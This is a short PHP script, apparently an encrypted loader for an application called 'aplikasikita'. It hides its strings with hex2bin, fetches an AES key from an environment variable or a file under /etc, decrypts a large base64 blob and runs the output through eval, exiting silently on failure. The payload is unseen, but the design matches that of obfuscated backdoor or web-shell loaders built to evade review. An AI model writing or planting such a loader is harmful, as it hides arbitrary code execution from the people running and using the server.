<?php

$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('FDEwshFpY1T7H4vUWULT+w==');

$c=base64_decode(

'J/c2lKYtdAIBtG4cIcnfl7ifEYpvwU5Sb1EScjv8fWijwsDXg32LHDpwDs0WiAJ2ArMONOwCHVMP' .
'eHQLTKRg47DEP1frQ3AxLdDHhNMUFVDy0+nVjl7xNjUp+Wn2oyl0+2LosnMTfS4atpz3hpASmcAK' .
'5ctKXEYUceKvUoAH2LPI31GnW1IDNZmKhBy1TnOAgvXmLVc7x5HeLf6e1frFnwWTdZN/RzNlC7X9' .
'3+Iuo2wjJYhgwawtE+QqDO2/K6TRVBmmORzv0LeS1c/GzEhkwwQL7QOLszKeEKZXGpWq4VnOsAxW' .
'9sSQsSUBZmbB+BBiT/l2Z0mOelZKSNZy38+0FQ1gQu6Tt23BwUmYuW0PAYxuowktAlRIRLHZV0SK' .
'mPGW/9/qFFchow9B/R7NEK0pc1xhn0qy08us1e7HXCuIvmu5jdxFiMkYZGkWYfJI1Obt88souMIO' .
'g94ED9gnnqaaOuTrq3HR1e85aD9HPQOZna2RB2gah/9ebF3p+cjUFsxRBQSmnADcE1LS+omxfCIo' .
'XDmUkDcE+jvsl4YZIaGmOe96jBmh3V9SffGtgUdYCxQUJS4VA6d5Np31mlDjB3RKby1WfRA2t7l6' .
'ClbRLuTUKDZXGKBrO4D+/6numOoqg52FcSLgoFQnh58AvIFr0WgwnbXO0RhzjVnf1Ce8Zt6EmeaC' .
'0GbeV/8xLcKy2CLxKYvK5xRRxXU2wWMILEMwbjwNh0YgCT7nMeEtxtjGLl/HBqT/8aLduT/Nrq/Z' .
'PqJsTJUr/lUhq0geedXIpHYbp6xPh+Lhbbntc2hSPgsORsJJnBBGOPcevGpa8sUb3wo5t1/qZDwQ' .
'rjME+xwoVFSslZZTCr6LPa6/n7/XstMxiZ3MmhCucq/hAV1Op6xdIOhVnWaVt+ZEHniqdIc5KcAH' .
'Zh1zPElfjvrWSDJq2GKQqwI1I5vZfbRtRY5REKbhO1BgMwLrR4SFzhuqXRrf6BE4Kx1ZEF6qLljj' .
'v9viCa8pyVXmnOwQLw1K3Wmsk6YnIeeUcbsRWvVrlhWFrReIja6+E2UwlkxGixyjSqZ7Ri6vK7fT' .
'upJHWgJKiXGqbOePrLI8wrBYelBKIkcC9fTgaKPhslKTdxiaQhjAp8+3GfhIUpu7G/JzEPopj/TS' .
'9aeyI4T6SMbpWf83Cf1SmN7agyVspQb6Wq9CtS4vBS5cGB2zSXdNemtxDyrvf2WWaEVCkU+khpZe' .
'lTr6QUj6RkeWJsf8iz5XUEh73DQ3xchUFQinR79HwXgBzohiKe0VMmo9jejiYD6usRvrTGq87Wv0' .
'oc/mj+yP07G/vYTclh4k0UZKaHGdZCU6yiwzQ2G0JPuhTq0QnG1vJWKGl4VMdsMPwWUlZEbvh4tt' .
'DkmkSBEfb8/+nDJAk+ttFVCDYwn7vjOwloiiPcrOpkCtEUE6QBMPvbNGrcfgHSfazoQDlS6M6mWf' .
'lRxfqhrwhWNbI0u32CLZ9NAmwSjzHJW8dcD4PPScRvMHLhD+brUWAQDYMOemHdALth9xarOjNMP5' .
'YC+c5TjxV3QjyLzcBuuYLSJ1hZ6VU1EM+d79uz09OV8AhId+4JKyOwg3wSPGK33Qm3mQdb2gtU2S' .
'06EbWXP+HNtDI+RvNtf8wKLOoNfOlSXjirPpFrTRoQygz/iRwl7OXUw+EZOOgkf5R1jX2vpQ1MA4' .
'AK2F9KBMwV60d42m49ck11b13SmaZ6NW1gV9mXiNYdikS0lgB+RZsuuQfhrO1xaArqb0mOn/XcFK' .
'mUcnI27CjEqA4fkjoau6dpt1dG0RZgjppHPvipJAxXniLtUN5C3nnNy7ernL97chQ4UtpuvHXbWo' .
'/AlQW8y2dQz+ZpFibsI9Ac0poofMTCaTMxn21rvwGKRMUpGX4+oEQ6u9rAsK5JQEJAVrzJi7e+WY' .
'iohEbb+F8MUcTXYGW0DZbihBRYJbmq8vFuisELKlIKZHeQEUjPthZBKuYqaHJ8FWCzNNecKCCvnr' .
'Nm6Qzm4rQ/sArWcWEhD6j/mY9wgVQpUOd+IqUwSJ00OWlkZehC3GICrbtcDso28cr+R3JiwvG+Zd' .
'7/YaZQpxdK/tnYhsIKrkYOBK4rJosvzRdHBaBjUzabiI3AfTkSGYtxOkiy/l6C45yU5Ns6QBxUGy' .
'xCDCM1R1setaNYECB9AqERl4eF4NjKWU/JRx8MbHtu34l8llWloLk2ukN+92B+1IZ1otA+Sv9dQ0' .
'dcYfmTP5PUowLeBvn5MdSusMuR3x9HldF4ZVqyYO75sFjdV0k+YOn3FGA0y3PtAqJsB1H9A02Foo' .
'00ztY+K2hZf+KSVLsbtq1zlsKj5NWuKOzTh/uA054+6V/A=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval('?>'.$d);

